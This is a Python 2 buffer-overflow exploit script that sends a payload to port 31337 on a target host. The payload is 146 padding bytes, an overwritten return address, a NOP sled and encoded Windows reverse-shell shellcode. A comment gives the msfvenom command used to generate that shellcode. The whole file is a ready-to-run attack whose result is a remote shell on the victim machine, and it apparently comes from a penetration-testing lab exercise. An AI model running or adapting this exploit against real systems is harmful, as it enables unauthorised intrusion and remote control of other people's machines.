#!/usr/bin/python
#coding: utf-8

import socket, sys
from struct import pack

ip_address = sys.argv[1]
rport = 31337


#msfvenom -p windows/shell_reverse_tcp LHOST=<your-ip> EXITFUNC=thread LPORT=<your-port> -b "\x00\x0a" -a x86 --platform windows -e x86/shikata_ga_nai -f c

shellcode=("\xb8\x97\x02\xe7\x71\xda\xc9\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x31\x47\x12\x83\xc7\x04\x03\xd0\x0c\x05\x84\x22\xf8\x4b"
"\x67\xda\xf9\x2b\xe1\x3f\xc8\x6b\x95\x34\x7b\x5c\xdd\x18\x70"
"\x17\xb3\x88\x03\x55\x1c\xbf\xa4\xd0\x7a\x8e\x35\x48\xbe\x91"
"\xb5\x93\x93\x71\x87\x5b\xe6\x70\xc0\x86\x0b\x20\x99\xcd\xbe"
"\xd4\xae\x98\x02\x5f\xfc\x0d\x03\xbc\xb5\x2c\x22\x13\xcd\x76"
"\xe4\x92\x02\x03\xad\x8c\x47\x2e\x67\x27\xb3\xc4\x76\xe1\x8d"
"\x25\xd4\xcc\x21\xd4\x24\x09\x85\x07\x53\x63\xf5\xba\x64\xb0"
"\x87\x60\xe0\x22\x2f\xe2\x52\x8e\xd1\x27\x04\x45\xdd\x8c\x42"
"\x01\xc2\x13\x86\x3a\xfe\x98\x29\xec\x76\xda\x0d\x28\xd2\xb8"
"\x2c\x69\xbe\x6f\x50\x69\x61\xcf\xf4\xe2\x8c\x04\x85\xa9\xd8"
"\xe9\xa4\x51\x19\x66\xbe\x22\x2b\x29\x14\xac\x07\xa2\xb2\x2b"
"\x67\x99\x03\xa3\x96\x22\x74\xea\x5c\x76\x24\x84\x75\xf7\xaf"
"\x54\x79\x22\x7f\x04\xd5\x9d\xc0\xf4\x95\x4d\xa9\x1e\x1a\xb1"
"\xc9\x21\xf0\xda\x60\xd8\x93\xee\x7f\xe0\x90\x87\x7d\xe4\x7f"
"\x80\x0b\x02\x15\x20\x5a\x9d\x82\xd9\xc7\x55\x32\x25\xd2\x10"
"\x74\xad\xd1\xe5\x3b\x46\x9f\xf5\xac\xa6\xea\xa7\x7b\xb8\xc0"
"\xcf\xe0\x2b\x8f\x0f\x6e\x50\x18\x58\x27\xa6\x51\x0c\xd5\x91"
"\xcb\x32\x24\x47\x33\xf6\xf3\xb4\xba\xf7\x76\x80\x98\xe7\x4e"
"\x09\xa5\x53\x1f\x5c\x73\x0d\xd9\x36\x35\xe7\xb3\xe5\x9f\x6f"
"\x45\xc6\x1f\xe9\x4a\x03\xd6\x15\xfa\xfa\xaf\x2a\x33\x6b\x38"
"\x53\x29\x0b\xc7\x8e\xe9\x2b\x2a\x1a\x04\xc4\xf3\xcf\xa5\x89"
"\x03\x3a\xe9\xb7\x87\xce\x92\x43\x97\xbb\x97\x08\x1f\x50\xea"
"\x01\xca\x56\x59\x21\xdf")

if __name__ == '__main__':

        junk = "A"*146

        eip = pack("<L", 0x080414c3)

        nops = "\x90"*16

        payload = junk + eip + nops + shellcode

        try:

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip_address, rport))

                s.send(payload+"\r\n")

        except:
                print "Connection dropped"
